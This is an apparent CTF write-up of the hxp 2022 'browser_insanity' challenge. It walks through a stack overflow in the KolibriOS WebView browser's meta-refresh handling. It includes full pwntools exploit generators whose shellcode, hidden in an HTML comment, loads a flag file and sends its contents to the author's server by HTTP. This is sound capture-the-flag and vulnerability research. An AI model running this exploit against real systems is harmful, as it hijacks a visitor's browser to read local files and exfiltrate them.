## Intro

This week I participated in [hxp 2022](https://ctftime.org/event/1845) and I've managed to solve a challenge called `browser_insanity`. It was a pwn challenge where we need to read arbitrary file in the filesystem.


## Description

Ever wanted to hack a tiny OS written in x86-32 assembly and C\-\-? Me neither but itâ€™s hxp CTF 2022.

Give us an URL, the user in the KolibriOS VM will visit it. You need to get the flag from `/hd0/1/flag.txt`
The source code you could get from: https://repo.or.cz/kolibrios.git/tree/7fc85957a89671d27f48181d15e386cd83ee7f1a

The browser is at `programs/cmm/browser` in the source tree. It relies on a couple of different libraries (e.g. `programs/develop/libraries`), grep around.
KolibriOS has its own debugger, `DEBUG`, available on the desktop. It may come in useful.
The kernel ABI is at `kernel/trunk/docs/sysfuncs.txt`.

For building random pieces: `INCLUDE=path_to_header.inc fasm -m 1000000 -s debug.s file.asm file.out`

So basically we are provided with an unmodified [KalibriOS](https://kolibrios.org/en/) image that is run by qemu-system. `enter_challenge.py` is a proxy between us and KolibriOS - it will take URL from us and pass it to the WebView browser inside KolibriOS. The first idea is to create a page that will be visited and will allow the exploitation of some vulnerability.


## Environment

To do a bit of reconnaissance I started the VM using slightly modified `run_vm.sh` script which loads the `kolibri.img` and looked around. After booting we see:

There is also a built-in debugger:

![](kolibri_debug.png)

We can load programs into it using `load` command, so in order to debug webview we can run `load /sys/network/webview`. After loading we see 32bit assembly :) I've experimented with it for a little and looks like all memory is executable, if we had control over `ebp`, we could execute arbitrary code. Sounds good.


## Vulnerability

The WebView browser is written in C\-\- language which is similar to C, so reading code was not a problem. The browser has many dependency libraries. During the CTF I was thinking about making a simple fuzzer which will test the browser code and look for crashes, but first I've decided to look around for a bit longer and I've found an interesting line of code in one of the functions responsible for setting styles for html elements:

```c
void TWebBrowser::tag_meta_xml()
{
	if (custom_encoding == -1) if (tag.get_value_of("charset")) 
	|| (tag.get_value_of("content")) || (tag.get_value_of("encoding"))
	{
		EDX = strrchr(tag.value, '=') + tag.value; //search in content=
		if (ESBYTE[EDX] == '"') EDX++;
		strlwr(EDX);
		EAX = get_encoding_type_by_name(EDX);
		if (EAX!=-1) ChangeEncoding(EAX);
	}
	if (streq(tag.get_value_of("http-equiv"), "refresh")) && (tag.get_value_of("content")) {
		if (tag.value = strstri(tag.value, "url")) strcpy(#redirect, tag.value);
	}
	if (streq(tag.get_value_of("name"), "application")) {
	    if (application_mode) {
	        if (tag.get_number_of("left")) {
                MoveSize(tag.number,-1,-1,-1);
            }
            if (tag.get_number_of("top")) {
                MoveSize(-1,tag.number,-1,-1);
            }
            if (tag.get_number_of("width")) {
                MoveSize(-1,-1,tag.number,-1);
            }
            if (tag.get_number_of("height")) {
                MoveSize(-1,-1,-1,tag.number);
            }
	    }
    }
}
```

Notice line number 13. There is unrestricted `strcpy`, so we can easily utilize that to overwrite some memory. `#redirect` field is a member of the following global (?) struct:
```c
struct TWebBrowser {
	llist list;
	STYLE style;
	dword draw_y, draw_x, draw_w, left_gap;
	dword o_bufpointer;
	int cur_encoding, custom_encoding;
	bool link, t_html, t_body;
	dword bufpointer;
	dword bufsize;
	dword is_html;
	collection img_url;
	char header[150];
	char linebuf[500];
	char redirect[URL_SIZE];

	bool secondrun;

	void SetStyle();
...
```

The logic populating `tag.value` is located in `programs\cmm\browser\TWB\parse_tag.h`. Unfortunately there is call to `strlwr` and `strrtrim` in `get_next_param`, so `tag.value` won't contain whitespaces and upper letters. 

## Exploitation

### Checking if bug is exploitable

Let's create a simple `index.html` page with a super long `meta` element with `http-equiv` tag set to `refresh` and `content` tag starting with `url` and containing a lot of characters (which are truncated on the snippet below):

```html
<!DOCTYPE html>
<html>

<head>
  <meta http-equiv="refresh"  content="urlAAAAAAAAAAAAAA..." />
</head>

<body>
</body>

</html>
```

Now we need to host the page somewhere, run the WebView under the debugger and visit the page.

![](webview_crash.png)

Page fault! Now we need to somehow check what happened and where. To do so, it would be good to set breakpoint before call to faulty `strcpy`. I found the binary in `/sys/network` but I couldn't disassemble it. After a little bit of googling I figured out that it is packed by tool called `kpack`, so to unpack it I used [kunpack](http://board.kolibrios.org/viewtopic.php?f=6&t=1954#p38497) and then I was able to load it into disassembler (binary does not have symbols). After a while I had the address when binary is calling our `strcpy` - 0x6a8b, so we can easily put the breakpoint there (no ASLR here!) and inspect where data is being copied.

![](strcpy_debug.png)

`edi` points to our `#redirect` field, `esi` points data to be copied. Notice that `esp` is not that far from `edi`, so maybe we can somehow overflow the stack? Crafting another `.html` file with a `content` value set to `url`+`58610*'A'` should overflow the return address from `strcpy`. 

![](stack_overflow.png)

We have it - we are controlling, so now when code does a `ret` from `strcpy` it jumps to `0x41414141`. You can immediately think about smuggling a malicious code in our tag, but unfortunately it cannot contain a null byte, because `strcpy` will stop reading it further and even if the payload would be null-less, tag value is "lowerized" (`strlwr`) - dead end? 

### Crafting the exploit

Not really, we can utilize the html comments, they shouldn't be mutated in any way. Here is the code responsible for parsing them:

```c
bool _tag::parse(dword _bufpos, bufend)
{
	bool retok = true;
	dword bufpos = ESDWORD[_bufpos];
	dword params, paramsend;

	dword closepos;
	dword whitepos;
	dword openpos;

	if (name) strcpy(#prior, #name); else prior = '\0';
	name = '\0';
	attributes.drop();
	values.drop();		

	if (!strncmp(bufpos,"!--",3))
	{
		bufpos+=3;
		//STRSTR
		while (strncmp(bufpos,"-->",3)!=0) && (bufpos < bufend)
		{
			bufpos++;
		}
		bufpos+=2;
		retok = false;
		goto _RET;
	}
...
```

so we can easily put our payload in the comment, but we need to find out where it will be located in memory. We can craft a simple web page and put a breakpoint in function above. Let's put breakpoint on address `0x3A43`, so we can check out where our comment is.

![](comment_in_memory.png)


As we can see, `esi` register points to our data, so we want to jump to `0x31c54b` (`1\xc5K`), so the `K` will be turned into `k`, which means that the code will jump to `0x31c56b`. We can handle that by putting bunch of `nop`s in our payload. We also want to load a file into memory, so we have to use some syscalls to do it. Quick look at the docs reveals needed syscall:

```
======================================================================
========== Function 68, subfunction 27 - load file ===================
======================================================================
Parameters:
  * eax = 68 - function number
  * ebx = 27 - subfunction number
  * ecx = pointer to the string with path to file,
    rules of path forming can be found in function 70 description.
Returned value:
  * eax = pointer to the loaded file, or zero
  * edx = size of the loaded file, or zero
Remarks:
  * function loads file and unpacks, if necessary
  * Before this call one must initialize process heap by call to
    subfunction 11.  
```

Code for crafting the payload has the following form (it is also available on my [github](https://github.com/rivit98/ctf-writeups/tree/master/hxpctf_2022/browser_insanity)):

```python
from pwn import *

with open("index.html", 'rb') as f:
    templ = f.read()

payload_start = 0x31c552
str_addr = payload_start+0x80
flag_location = b'/hd0/1/flag.txt\0'

context.arch = 'i386'
payload = asm('nop') * 0x30 +  asm(f"""
mov eax, 0x44
mov ebx, 0x1b
mov ecx, {str_addr}
int 0x40
""")

padding = (str_addr - payload_start) - len(payload)
payload += b'\x90' * padding
payload += flag_location

templ = templ.replace(b'REPLACE', payload).replace(b'JUMP_ADDR', p32(payload_start).replace(p8(0), b''))

with open("index.html2", 'wb') as f:
    f.write(templ)
```

Now launching `WebView` under the debugger and stepping a little over the code confirms that the exploit works and flag was loaded into memory.

![](code_execution.png)


![](flag_loaded.png)

Now it is time to exfiltrate the flag. We know that the VM has access to the internet, so we can make HTTP request with flag as a parameter. I've found useful function which can do work for us:

```c
bool GetUrl(dword _http_url)
{
	char new_url_full[URL_SIZE+1];

	if (!strncmp(_http_url,"http:",5)) {
		http.get(_http_url);
		return true;
	} else if (!strncmp(_http_url,"https://",8)) {
		strcpy(#new_url_full, "http://gate.aspero.pro/?site=");
		strncat(#new_url_full, _http_url, URL_SIZE);
		http.get(#new_url_full);
		return true;
	}
	return false;
}
```

Actually, we will use only `http.get` function. Quick check in IDA reveals that address where we need to jump is: `0x1137c`, so we just need to create the url for HTTP request. Final exploit generator looks like this:

```python
from pwn import *

with open("index.html", 'rb') as f:
    templ = f.read()

payload_start = 0x31c552
str_addr = payload_start+0x80
flag_location = b'/hd0/1/flag.txt\0'
base_url = b'http://rivit.dev:13378/?c='

context.arch = 'i386'
payload = asm('nop') * 0x30 +  asm(f"""
mov eax, 0x44
mov ebx, 0x1b
mov ecx, {str_addr}
int 0x40

mov esi, eax
mov edi, {str_addr+len(flag_location)+len(base_url)}

loop:
    lodsb
    stosb
    test al, al
jnz loop

push {str_addr+len(flag_location)}
push 0x1137c
ret
""")

padding = (str_addr - payload_start) - len(payload)
payload += b'\x90' * padding
payload += flag_location
payload += base_url

templ = templ.replace(b'REPLACE', payload).replace(b'JUMP_ADDR', p32(payload_start).replace(p8(0), b''))

with open("index.html2", 'wb') as f:
    f.write(templ)
```

### Running the exploit locally

Let's run the browser and put breakpoint before `http.get` call.

![](before_http_call.png)

And after continuing, we see that something hit the web server :)

### Running the exploit on a remote

## Summary

This was the first time I exploited a custom OS and it was a great experience. I feel like the WebView browser is damn buggy and there are multiple ways to get code execution. Overall it was a good challenge, I enjoyed solving it.
